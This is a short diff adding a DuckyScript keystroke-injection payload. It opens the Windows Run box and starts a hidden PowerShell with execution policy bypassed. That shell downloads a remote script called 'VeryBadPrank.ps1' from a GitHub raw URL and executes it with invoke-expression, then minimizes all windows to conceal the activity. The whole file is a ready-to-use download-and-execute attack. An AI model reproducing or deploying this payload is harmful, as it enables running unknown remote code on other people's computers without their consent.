@@ -1,0 +1,6 @@
+WINDOWS r
+DELAY 500
+STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/MajorMarmalade/Sounds/main/VeryBadPrank/VeryBadPrank.ps1?dl=1; invoke-expression $pl
+ENTER
+DELAY 1000
+WINDOWS M
